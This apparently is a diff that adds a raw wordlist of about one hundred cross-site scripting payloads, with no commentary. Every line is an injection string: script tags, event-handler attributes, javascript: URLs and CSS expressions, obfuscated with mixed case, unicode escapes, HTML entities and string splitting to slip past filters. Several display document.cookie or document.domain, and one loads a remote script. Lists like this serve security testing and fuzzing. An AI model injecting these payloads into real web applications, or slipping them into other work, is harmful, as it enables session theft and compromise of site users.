@@ -1,0 +1,100 @@
+/></track><video><source onerror=jAvaScrIpt:window.onerror=alert();script:al\u0065rt(); // <tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr>
+ onMousEover='alert("xss".toUpperCase()); // <tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr>
+!#%&)(*+,-./:;=?@]\[^_'}|{~""" style="background:url(javascript:alert`1`)" "
+!#%&)(*+,-./:;=?@]\[^_'}|{~""" style="background:url(jAvasCript:alert(1))" "
+!#%&)(*+,-./:;=?@]\[^_'}|{~""" style="background:url(jAvasCript:alert`1`)" "
+!#%&)(*+,-./:;=?@]\[^_'}|{~"<s>"><script>alert`1`</script><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+!#%&)(*+,-./:;=?@]\[^_'}|{~"<s>"><sCriPt>alert(1)</ScrIpt><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+!#%&)(*+,-./:;=?@]\[^_'}|{~"<s>"><sCriPt>alert`1`</ScrIpt><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+!#%&)(*+,-./:;=?@]\[^_'}|{~&#39;<s>&#39;><script>alert`1`</script><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+!#%&)(*+,-./:;=?@]\[^_'}|{~&#39;<s>&#39;><ScrIpt>alert(1)</ScRipt><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+!#%&)(*+,-./:;=?@]\[^_'}|{~&#39;<s>&#39;><ScrIpt>alert`1`</ScRipt><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+!#%&)(*+,-./:;=?@]\[^_'}|{~<s><script>alert`1`</script><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+!#%&)(*+,-./:;=?@]\[^_'}|{~<s><sCripT>alert(1)</ScrIpt><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+!#%&)(*+,-./:;=?@]\[^_'}|{~<s><sCripT>alert`1`</ScrIpt><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+!#%&)(*+,-./:;=?@]\&#39;&#39;style=&#39;background:url(javascript:alert`1`)&#39; &#39;
+!#%&)(*+,-./:;=?@]\&#39;&#39;style=&#39;background:url(JavaCcRipT:alert(1))&#39; &#39;
+!#%&)(*+,-./:;=?@]\&#39;&#39;style=&#39;background:url(JavaCcRipT:alert`1`)&#39; &#39;
+" onmOusEovEr="alert('\u0058\u0053\u0053') // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+" onmOusEovEr="alert`'\u0058\u0053\u0053'` // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+" onmOusEovEr="alert('&#0088;&#0083;&#0083;') // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+" onmOusEovEr="alert`'&#0088;&#0083;&#0083;'` // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+" onmOusEovEr="alert(/&#0088;&#0083;&#0083;/.source) // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+" onmOusEovEr="alert`/&#0088;&#0083;&#0083;/.source` // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"'><script>eval("alert`document\x2ecookie`")</script><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"'><sCriPt>eval("alert(document\x2ecookie)")</ScRipT><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"'><sCriPt>eval("alert`document\x2ecookie`")</ScRipT><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"/onmOusEmoVe="window['\u0061lert']('\u0058SS') // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"/onmOusEovEr="window['aler'+'t']('XS'+'S')"><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"&#39;><img src="javascript:alert`1`><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"&#39;><img src="jaVaScrIpT:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"&#39;><img src="jaVaScrIpT:alert`1`><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"&#39;><script>alert`1`</script> onclick=alert(1) // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"&#39;><script>alert(1)</script> OnClicK=alert(1) // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"&#39;><script>alert`1`</script> OnClicK=alert(1) // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"&#39;><ScRipT>alert(1)</scrIPt> onclick=alert(1) // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"&#39;><ScRipT>alert(1)</scrIPt> OnClicK=alert(1) // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"&#39;><ScRipT>alert`1`</scrIPt> onclick=alert(1) // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"&#39;><ScRipT>alert`1`</scrIPt> OnClicK=alert(1) // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"</table><video><source onerror=javascript:window.onerror=alert();onerror=\u0061lert``; /* <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td> */
+"</table><video><source onerror=jAvaScrIpt:window.onerror=alert();onerror=\u0061lert``; /* <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td> */
+"</table><video><source onerror=javascript:window.onerror=alert();onerror=alert(); /* <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td> */
+"</table><video><source onerror=javascript:window.onerror=alert();onerror=alert``; /* <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td> */
+"</table><video><source onerror=jAvaScrIpt:window.onerror=alert();onerror=alert``; /* <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td> */
+"</table><video><source onerror=javascript:window.onerror=alert();script:\u0061lert``; /* <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td> */
+"</table><video><source onerror=jAvaScRipt:window.onerror=alert();script:\u0061lert``; /* <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td> */
+"><s\r\n_oncut=0\r\nalert()><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"><s\r\n_OnCut=0\r\nalert()><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"><script</*\r\n*/alert(1);/*\r\n*/</script><!-- <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"><ScRipt</*\r\n*/alert(1);/*\r\n*/</sCriPt><!-- <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"><sCriPt>eval('u0061u006cu0065u0072u0074u0028u0027u0058u0053u0053u0027u0029');</ScrIpt><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"><scRipt>eval("al"+"ert(1)");</Script><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"><svg><ScRipt>alert&#40/1/.source&#41</scRiPt><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"oNbeForePaste="&#000119indow['&#00097lert']('&#00088SS')"  /* <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td> */
+"onBluR="&#x0077indow['&#x0061lert']('&#x0058SS')"  // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"onCopY="&#0119indow['&#097lert']('&#088SS')"  // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"onDblCliCk="&#00119indow['&#0097lert']('&#0088SS')" // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"onKeyDown="document.write('<x73cRiPt>x61lert(x22XSSx22)</x73cript>')" // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"onKeyDOwn="document.write('<x73cript>x61lert(x22XSSx22)</x73cript>')" // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"onKeyPREss="/127641/['constructor']['constructor']('al'+'ert'+'('+'''+1+'''+')')() // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+"onKeyPrESS="u0077indow['u0061lert']('u0058SS')" /* <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td> */
+"onMoUsEovEr="&#x077indow['&#x061lert']('&#x058SS')"  /* <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td> */
+"onmoUsEovEr="alert(decodeURI(decodeURI(/%58%53%53/.source)))" /* <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td> */
+"onPASTe="&#119indow['&#97lert']('&#88SS')"  /* <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td> */
+\u0061lert();script:\u0061lert();<video><source onerror=javascript:window.onerror=alert();java // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+\u0061lert();script:\u0061lert();<video><source onerror=jaVaScrIpt:window.onerror=alert();java // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+\u0061lert();script:\u0061lert();<video><source onerror=jaVaScrIpt:window.onerror=alert``;java // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+\u0061lert();</script>&#x09;<track/<progress <!-- <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td> -->
+\u0061lert``;</script>&#x09;<track/<progress <!-- <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td> -->
+&#39; style=&#39;background:url(javascript:alert`1`)&#39; &#39; // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+&#39;;alert(1);&#39; // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+&#39;;alert`1`;&#39; // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+&#x09;</th><video><source onerror=javascript:window.onerror=alert();onerror=\u0061lert(); <!-- <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td> -->
+%EF%BC%9CScRIpt%EF%BC%9Ealert(1)%EF%BC%9C/scRiPt%EF%BC%9E <!-- <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td> -->
+</command>enctype=rows=<video><source onerror=alert``; // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+</iframe> /></textarea><video><source oNeRRor=alert(); // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<%u00df style="color:ex/***/pression(alert`1`);"/><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<a href="test:),< s c r i p t > a l e r t ` document.domain ` < / s c r i p t >">click me</a><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<a href="test:),< S c R i P t > a l e r t ( document.domain ) < / s C r I p t >">click me</a><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<body onload=alert`1`; /><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<body oNLoad=alert(1); /><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<body oNLoad=alert`1`; /><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<body onmouseover=alert`1`; <canvas </basefont><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<body onMoUsEovEr=alert(1); <canvas </basefont><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<body onMoUsEovEr=alert`1`; <canvas </basefont><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<iframe/*/onload=charset=alert``;><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<iframe/onload=alert``;>size=<command <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<iframe/onload=alert`1`; /><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<img src= <meter onerror=alert``;?n<script></script><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<img src=# <keygen onErroR=?u0061lert``;><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<object/onLoAd="onfocus=alert();"<script type="text/javascri pt"><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<sCrIPt src="data:text/html,al?u0065rt``;"<script></sCriPt><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<scrIpT src="http://example.com/xss.jpg"></script><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<scRipT>al?u0065rt();</ScRipt></tr><th/ <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<sCrIpT>onerror=?u0061lert(1);</sCript><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<svg/<canvas/<select/onload=alert`1`;><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<svg/onload=alert`1`; </del><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+<video><source <tfoot <td onerror=javascript:window.onerror=alert``;alert``; // <br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+colspan=<iframe <a onload=al?u0065rt``;><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+icon=<iframe/<body onload=?u0061lert``;><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
+kind=<body <img onload=alert(1);><br><br><br><br><br><br><br><br><br><br><br><br><td></td><td></td><td></td><td></td>
